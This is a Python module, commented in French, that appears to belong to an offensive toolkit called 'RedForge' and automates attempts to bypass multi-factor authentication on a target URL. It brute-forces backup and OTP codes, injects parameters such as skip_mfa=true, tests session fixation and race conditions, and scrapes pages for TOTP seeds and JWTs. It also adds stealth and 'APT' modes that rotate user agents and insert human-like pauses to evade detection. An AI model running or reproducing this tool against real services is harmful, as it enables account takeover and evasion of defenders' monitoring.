#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de contournement MFA pour RedForge
Détecte et exploite les failles dans les implémentations MFA
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib
import hmac

@dataclass
class MFABypassConfig:
    """Configuration avancée pour le contournement MFA"""
    # Délais
    delay_between_tests: Tuple[float, float] = (1, 3)
    delay_between_attempts: Tuple[float, float] = (0.5, 1.5)
    
    # Comportement
    max_attempts: int = 10
    test_all_techniques: bool = True
    aggressive_mode: bool = False
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    respect_rate_limits: bool = True
    
    # APT
    apt_mode: bool = False
    human_behavior: bool = False
    
    # Techniques spécifiques
    test_race_conditions: bool = True
    test_session_leak: bool = True
    test_weak_backup_codes: bool = True
    test_timing_attacks: bool = True
    
    # Proxies
    proxies: List[str] = field(default_factory=list)


class MFABypass:
    """Contournement avancé de l'authentification multi-facteurs"""
    
    def __init__(self, config: Optional[MFABypassConfig] = None):
        """
        Initialise le contournement MFA
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or MFABypassConfig()
        
        # Patterns MFA améliorés
        self.mfa_patterns = [
            r'2fa', r'mfa', r'two[-_]factor', r'otp', r'verification',
            r'auth[-_]code', r'security[-_]code', r'google[-_]authenticator',
            r'authenticator', r'totp', r'sms', r'email verification',
            r'push notification', r'authy', r'duo', r'yubikey'
        ]
        
        # Techniques de contournement avancées
        self.bypass_techniques = {
            "parameter_injection": self._test_parameter_injection,
            "response_manipulation": self._test_response_manipulation,
            "session_fixation": self._test_session_fixation,
            "backup_code_abuse": self._test_backup_code_abuse,
            "oauth_misconfiguration": self._test_oauth_misconfiguration,
            "rate_limiting_bypass": self._test_rate_limiting_bypass,
            "jwt_manipulation": self._test_jwt_manipulation,
            "race_condition": self._test_race_condition,
            "timing_attack": self._test_timing_attack,
            "session_leak": self._test_session_leak,
            "qr_code_reuse": self._test_qr_code_reuse,
            "totp_seed_extraction": self._test_totp_seed_extraction
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.test_count = 0
        self.success_count = 0
        self.rate_limit_hits = 0
        
        # Cache
        self.session_cache = {}
        self.token_cache = set()
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de contournement MFA
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - session_cookie: Cookie de session valide
                - test_all_techniques: Tester toutes les techniques
                - user_agent: User-Agent personnalisé
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.test_count = 0
        self.success_count = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        print(f"  → Test de contournement MFA sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Analyse furtive")
        
        vulnerabilities = []
        
        # Détection MFA avancée
        mfa_detected, mfa_type = self._detect_mfa_advanced(target, **kwargs)
        
        if mfa_detected:
            print(f"      ✓ MFA détecté (type: {mfa_type}) - analyse des contournements...")
            
            # Sélectionner les techniques à tester
            techniques_to_test = self._select_techniques(mfa_type, kwargs)
            
            for technique_name in techniques_to_test:
                # Pause APT
                if self.config.apt_mode and self.config.human_behavior:
                    self._apt_pause()
                elif self.config.random_delays:
                    time.sleep(random.uniform(*self.config.delay_between_tests))
                
                technique_func = self.bypass_techniques.get(technique_name)
                if technique_func:
                    result = technique_func(target, **kwargs)
                    self.test_count += 1
                    
                    if result.get('vulnerable'):
                        self.success_count += 1
                        vulnerabilities.append({
                            "technique": technique_name,
                            "severity": result.get('severity', 'HIGH'),
                            "details": result.get('details'),
                            "proof": result.get('proof'),
                            "risk_score": result.get('risk_score', 70)
                        })
                        print(f"      ✓ Contournement MFA possible: {technique_name}")
                        
                        # En mode agressif, continuer à tester
                        if not self.config.aggressive_mode and kwargs.get('stop_on_find', True):
                            break
        else:
            print(f"      ✓ Aucun MFA détecté")
        
        return self._generate_results(target, mfa_detected, mfa_type, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'test_all_techniques' in kwargs:
            self.config.test_all_techniques = kwargs['test_all_techniques']
        if 'aggressive_mode' in kwargs:
            self.config.aggressive_mode = kwargs['aggressive_mode']
        if 'max_attempts' in kwargs:
            self.config.max_attempts = kwargs['max_attempts']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.human_behavior = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_tests = (5, 15)
            self.config.delay_between_attempts = (2, 5)
    
    def _detect_mfa_advanced(self, target: str, **kwargs) -> Tuple[bool, str]:
        """
        Détection avancée de MFA avec identification du type
        
        Returns:
            Tuple[bool, str]: (MFA détecté, type de MFA)
        """
        mfa_type = "unknown"
        
        try:
            # Headers personnalisés
            headers = self._get_stealth_headers()
            
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Vérifier les patterns
            for pattern in self.mfa_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    # Identifier le type spécifique
                    if 'google' in response.text.lower():
                        mfa_type = "google_authenticator"
                    elif 'sms' in response.text.lower():
                        mfa_type = "sms"
                    elif 'email' in response.text.lower():
                        mfa_type = "email"
                    elif 'backup' in response.text.lower():
                        mfa_type = "backup_codes"
                    elif 'totp' in response.text.lower():
                        mfa_type = "totp"
                    else:
                        mfa_type = "generic"
                    
                    return True, mfa_type
            
            # Vérifier les headers
            mfa_headers = ['x-mfa-required', 'x-2fa-required', 'x-auth-mfa']
            for header in mfa_headers:
                if header in response.headers:
                    return True, "header_based"
            
            # Vérifier les cookies
            for cookie in response.cookies:
                if 'mfa' in cookie.name.lower() or '2fa' in cookie.name.lower():
                    return True, "cookie_based"
                    
        except Exception as e:
            print(f"      ⚠️ Erreur détection MFA: {e}")
        
        return False, mfa_type
    
    def _select_techniques(self, mfa_type: str, kwargs: Dict) -> List[str]:
        """Sélectionne les techniques à tester basé sur le type MFA"""
        if kwargs.get('techniques'):
            return kwargs['techniques']
        
        if self.config.test_all_techniques:
            return list(self.bypass_techniques.keys())
        
        # Techniques spécifiques par type MFA
        technique_map = {
            "google_authenticator": ["jwt_manipulation", "timing_attack", "totp_seed_extraction"],
            "sms": ["rate_limiting_bypass", "session_leak", "race_condition"],
            "email": ["parameter_injection", "session_fixation", "oauth_misconfiguration"],
            "backup_codes": ["backup_code_abuse", "rate_limiting_bypass"],
            "totp": ["timing_attack", "jwt_manipulation", "qr_code_reuse"],
            "header_based": ["response_manipulation", "parameter_injection"],
            "cookie_based": ["session_fixation", "jwt_manipulation"]
        }
        
        return technique_map.get(mfa_type, ["parameter_injection", "rate_limiting_bypass"])
    
    def _get_stealth_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        return headers
    
    def _test_parameter_injection(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste l'injection de paramètres pour contourner MFA"""
        result = {"vulnerable": False, "details": None, "severity": "HIGH"}
        
        # Paramètres à injecter
        inject_params = [
            'mfa_required=false',
            'skip_mfa=true',
            'bypass_2fa=1',
            'mfa_verified=true',
            'require_2fa=0',
            'mfa_bypass=true',
            '2fa_skip=1',
            'multifactor=false',
            'otp_required=0'
        ]
        
        session_cookie = kwargs.get('session_cookie')
        cookies = {'session': session_cookie} if session_cookie else {}
        
        for param in inject_params:
            try:
                # Construire l'URL avec paramètre
                parsed = urlparse(target)
                query = parse_qs(parsed.query)
                
                key, value = param.split('=')
                query[key] = [value]
                
                new_query = urlencode(query, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10, verify=False)
                
                # Vérifier si le MFA a été contourné
                if not self._contains_mfa_indicators(response.text):
                    result["vulnerable"] = True
                    result["details"] = f"Injection de paramètre: {param}"
                    result["proof"] = test_url
                    result["risk_score"] = 85
                    break
                    
            except Exception:
                continue
        
        return result
    
    def _test_response_manipulation(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste la manipulation de réponse pour contourner MFA"""
        result = {
            "vulnerable": False,
            "details": "Nécessite un proxy pour intercepter/modifier les réponses",
            "severity": "MEDIUM"
        }
        
        # Simulation de la technique
        # Dans un environnement réel, utiliser mitmproxy ou Burp Suite
        
        return result
    
    def _test_session_fixation(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste la fixation de session pour contourner MFA"""
        result = {"vulnerable": False, "details": None, "severity": "HIGH"}
        
        try:
            headers = self._get_stealth_headers()
            
            # Obtenir une session avant MFA
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            session_cookie = response.cookies.get('sessionid') or response.cookies.get('PHPSESSID')
            
            if session_cookie:
                # Tenter d'accéder à une ressource protégée
                test_url = target.rstrip('/') + '/dashboard'
                cookies = {'sessionid': session_cookie}
                
                test_response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10, verify=False)
                
                # Si accès direct sans MFA
                if test_response.status_code == 200 and 'login' not in test_response.text.lower():
                    result["vulnerable"] = True
                    result["details"] = "Fixation de session possible - le MFA n'est pas lié à la session"
                    result["proof"] = f"Session ID: {session_cookie}"
                    result["risk_score"] = 90
                    
        except Exception:
            pass
        
        return result
    
    def _test_backup_code_abuse(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste l'abus de codes de secours MFA"""
        result = {"vulnerable": False, "details": None, "severity": "HIGH"}
        
        # Codes de secours courants et patterns
        common_backup_codes = [
            '111111', '123456', '000000', '999999',
            '1234567890', '1111111111', '0000000000',
            'abcdef', 'abc123', 'password', 'backup123'
        ]
        
        # Patterns de codes (souvent 8-10 chiffres)
        for i in range(self.config.max_attempts):
            if i < len(common_backup_codes):
                code = common_backup_codes[i]
            else:
                # Générer des codes aléatoires
                code = ''.join(random.choices('0123456789', k=8))
            
            try:
                headers = self._get_stealth_headers()
                data = {'backup_code': code, 'code': code}
                
                response = requests.post(target, headers=headers, data=data, timeout=10, verify=False)
                
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    result["vulnerable"] = True
                    result["details"] = f"Code de secours faible ou prévisible: {code}"
                    result["proof"] = code
                    result["risk_score"] = 95
                    break
                
                # Délai entre les tentatives
                if self.config.random_delays:
                    time.sleep(random.uniform(*self.config.delay_between_attempts))
                    
            except Exception:
                continue
        
        return result
    
    def _test_oauth_misconfiguration(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste les mauvaises configurations OAuth"""
        result = {"vulnerable": False, "details": None, "severity": "MEDIUM"}
        
        oauth_endpoints = [
            '/oauth/authorize', '/oauth/token', '/auth/authorize',
            '/oauth2/authorize', '/oauth2/token', '/api/oauth/authorize'
        ]
        
        for endpoint in oauth_endpoints:
            test_url = target.rstrip('/') + endpoint
            try:
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # Vérifier les paramètres faibles
                    weak_params = ['skip_mfa', 'bypass', 'force', 'allow_skip']
                    for param in weak_params:
                        if param in response.text.lower():
                            result["vulnerable"] = True
                            result["details"] = f"Configuration OAuth faible sur {endpoint} (paramètre: {param})"
                            result["proof"] = test_url
                            result["risk_score"] = 75
                            break
                            
            except Exception:
                continue
        
        return result
    
    def _test_rate_limiting_bypass(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste le contournement du rate limiting sur MFA"""
        result = {"vulnerable": False, "details": None, "severity": "MEDIUM"}
        
        success_count = 0
        test_codes = ['000000', '111111', '222222', '333333', '444444', '555555', '666666']
        
        for i, code in enumerate(test_codes[:self.config.max_attempts]):
            try:
                headers = self._get_stealth_headers()
                data = {'code': code, 'otp': code}
                
                response = requests.post(target, headers=headers, data=data, timeout=10, verify=False)
                
                # Si plusieurs tentatives réussissent ou pas de blocage
                if response.status_code != 429 and 'too many' not in response.text.lower():
                    success_count += 1
                
                # Délai réduit pour ce test
                time.sleep(0.5)
                
            except Exception:
                continue
        
        if success_count > len(test_codes) / 2:
            result["vulnerable"] = True
            result["details"] = "Absence ou faible rate limiting sur les tentatives MFA"
            result["risk_score"] = 70
        
        return result
    
    def _test_jwt_manipulation(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste la manipulation de tokens JWT pour contourner MFA"""
        result = {"vulnerable": False, "details": None, "severity": "CRITICAL"}
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Chercher des tokens JWT
            jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
            jwt_tokens = re.findall(jwt_pattern, response.text)
            
            for token in jwt_tokens:
                # Vérifier la présence du claim MFA
                try:
                    # Décoder le payload (sans vérification)
                    payload = token.split('.')[1]
                    payload += '=' * (4 - len(payload) % 4)
                    decoded = base64.b64decode(payload).decode('utf-8')
                    
                    if 'mfa' in decoded.lower() or '2fa' in decoded.lower():
                        result["vulnerable"] = True
                        result["details"] = "Token JWT contient des claims MFA modifiables"
                        result["proof"] = token[:50] + "..."
                        result["risk_score"] = 85
                        break
                        
                except:
                    continue
                    
        except Exception:
            pass
        
        return result
    
    def _test_race_condition(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste les race conditions dans la validation MFA"""
        result = {"vulnerable": False, "details": None, "severity": "HIGH"}
        
        if not self.config.test_race_conditions:
            return result
        
        try:
            headers = self._get_stealth_headers()
            
            # Envoyer des requêtes simultanées
            def send_mfa_request(code):
                data = {'code': code}
                return requests.post(target, headers=headers, data=data, timeout=5, verify=False)
            
            codes = ['123456', '123456', '123457', '123458']
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(send_mfa_request, code) for code in codes]
                
                for future in as_completed(futures):
                    response = future.result()
                    if response.status_code == 200 and 'success' in response.text.lower():
                        result["vulnerable"] = True
                        result["details"] = "Race condition détectée - validation MFA non atomique"
                        result["risk_score"] = 90
                        break
                        
        except Exception:
            pass
        
        return result
    
    def _test_timing_attack(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste les timing attacks sur la validation MFA"""
        result = {"vulnerable": False, "details": None, "severity": "MEDIUM"}
        
        if not self.config.test_timing_attacks:
            return result
        
        try:
            headers = self._get_stealth_headers()
            timing_results = []
            
            # Tester différents codes et mesurer les temps
            test_codes = ['000000', '111111', '222222', '123456']
            
            for code in test_codes:
                start = time.time()
                data = {'code': code}
                response = requests.post(target, headers=headers, data=data, timeout=10, verify=False)
                elapsed = time.time() - start
                timing_results.append(elapsed)
            
            # Vérifier les variations de temps
            if max(timing_results) - min(timing_results) > 0.5:
                result["vulnerable"] = True
                result["details"] = "Variations de temps détectées - possible timing attack"
                result["risk_score"] = 60
                
        except Exception:
            pass
        
        return result
    
    def _test_session_leak(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste les fuites de session dans les logs ou URLs"""
        result = {"vulnerable": False, "details": None, "severity": "HIGH"}
        
        if not self.config.test_session_leak:
            return result
        
        try:
            headers = self._get_stealth_headers()
            
            # Vérifier les logs d'accès
            test_url = target + "?debug=true&trace=true"
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Chercher des tokens dans la réponse
            sensitive_patterns = [
                r'session[=:][a-f0-9]{32,}',
                r'token[=:][a-f0-9]{32,}',
                r'mfa[=:][0-9]{6}'
            ]
            
            for pattern in sensitive_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["details"] = f"Fuite de données sensibles dans les logs: {pattern}"
                    result["risk_score"] = 80
                    break
                    
        except Exception:
            pass
        
        return result
    
    def _test_qr_code_reuse(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste la réutilisation des QR codes TOTP"""
        result = {"vulnerable": False, "details": None, "severity": "MEDIUM"}
        
        try:
            headers = self._get_stealth_headers()
            
            # Chercher des QR codes dans les pages
            qr_pattern = r'data:image/(png|svg\+xml);base64,[A-Za-z0-9+/=]+'
            qr_codes = re.findall(qr_pattern, response.text if 'response' in locals() else '')
            
            if qr_codes:
                result["vulnerable"] = True
                result["details"] = "QR codes TOTP exposés - possible réutilisation"
                result["risk_score"] = 75
                
        except Exception:
            pass
        
        return result
    
    def _test_totp_seed_extraction(self, target: str, **kwargs) -> Dict[str, Any]:
        """Teste l'extraction des seeds TOTP"""
        result = {"vulnerable": False, "details": None, "severity": "CRITICAL"}
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Chercher des seeds TOTP dans le code source
            seed_patterns = [
                r'secret[=:][\'"]?([A-Z2-7]{16,})',
                r'totp_seed[=:][\'"]?([A-Z2-7]{16,})',
                r'issuer[=:][\'"]?([A-Za-z0-9]+)'
            ]
            
            for pattern in seed_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    result["vulnerable"] = True
                    result["details"] = f"Seeds TOTP exposées dans le code source"
                    result["proof"] = matches[0][:20] + "..."
                    result["risk_score"] = 95
                    break
                    
        except Exception:
            pass
        
        return result
    
    def _contains_mfa_indicators(self, text: str) -> bool:
        """Vérifie si le texte contient des indicateurs MFA"""
        for pattern in self.mfa_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, mfa_detected: bool, 
                         mfa_type: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "mfa_detected": mfa_detected,
            "mfa_type": mfa_type if mfa_detected else None,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "test_duration": duration,
            "tests_performed": self.test_count,
            "successful_tests": self.success_count,
            "rate_limit_hits": self.rate_limit_hits,
            "config": {
                "apt_mode": self.config.apt_mode,
                "aggressive_mode": self.config.aggressive_mode,
                "techniques_tested": len(self.bypass_techniques)
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(mfa_type, vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité MFA détectée"}
        
        severities = {}
        for v in vulnerabilities:
            sev = v.get('severity', 'MEDIUM')
            severities[sev] = severities.get(sev, 0) + 1
        
        max_risk = max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        
        return {
            "total": len(vulnerabilities),
            "by_severity": severities,
            "max_risk_score": max_risk,
            "critical_findings": [v for v in vulnerabilities if v.get('severity') == 'CRITICAL']
        }
    
    def _generate_recommendations(self, mfa_type: str, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = []
        
        if not vulnerabilities:
            recommendations.append("Aucune vulnérabilité MFA majeure détectée")
            return recommendations
        
        for vuln in vulnerabilities:
            technique = vuln['technique']
            if technique == "parameter_injection":
                recommendations.append("Ne pas accepter de paramètres client pour contrôler l'état MFA")
            elif technique == "session_fixation":
                recommendations.append("Lier les sessions MFA à l'ID de session et régénérer après auth")
            elif technique == "backup_code_abuse":
                recommendations.append("Utiliser des codes de secours forts et limiter les tentatives")
            elif technique == "jwt_manipulation":
                recommendations.append("Signer les JWT et ne pas stocker d'état MFA dans le token")
            elif technique == "race_condition":
                recommendations.append("Implémenter des mécanismes atomiques pour la validation MFA")
        
        return list(set(recommendations))


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    mfa = MFABypass()
    results = mfa.scan("https://example.com/login")
    print(f"Contournements MFA possibles: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = MFABypassConfig(apt_mode=True, human_behavior=True)
    mfa_apt = MFABypass(config=apt_config)
    results_apt = mfa_apt.scan("https://example.com/login", test_all_techniques=True)
    print(f"Contournements MFA trouvés (APT): {results_apt['count']}")